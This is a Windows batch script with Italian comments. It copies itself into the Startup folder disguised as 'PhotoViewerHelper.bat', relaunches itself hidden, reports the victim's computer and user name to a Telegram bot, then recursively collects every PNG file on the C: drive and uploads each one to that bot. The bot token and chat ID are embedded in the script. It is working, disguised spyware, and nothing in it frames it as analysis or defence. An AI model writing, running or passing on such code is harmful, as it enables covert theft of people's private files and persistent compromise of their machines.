@echo off
:: Modalità invisibile
if not "%1"=="--stealth" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PhotoViewerHelper.bat" >nul 2>&1
    start /B /MIN cmd /c "%~f0" --stealth
    exit
)

:: Configurazione Bot
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: Notifica iniziale
powershell -command "$null=Invoke-WebRequest -Uri '%API_URL%/sendMessage?chat_id=%CHAT_ID%&text=🔍 Scan avviato su %COMPUTERNAME% (%USERNAME%)' -UseBasicParsing"

:: Cerca e invia tutti i PNG
powershell -command "$files = Get-ChildItem -Path 'C:\' -Recurse -Include '*.png' -ErrorAction SilentlyContinue; foreach ($file in $files) { curl.exe -s -X POST '%API_URL%/sendDocument' -F 'chat_id=%CHAT_ID%' -F 'document=@\"$file.FullName\"' }"

:: Notifica completamento
powershell -command "$null=Invoke-WebRequest -Uri '%API_URL%/sendMessage?chat_id=%CHAT_ID%&text=✅ Scan completato' -UseBasicParsing"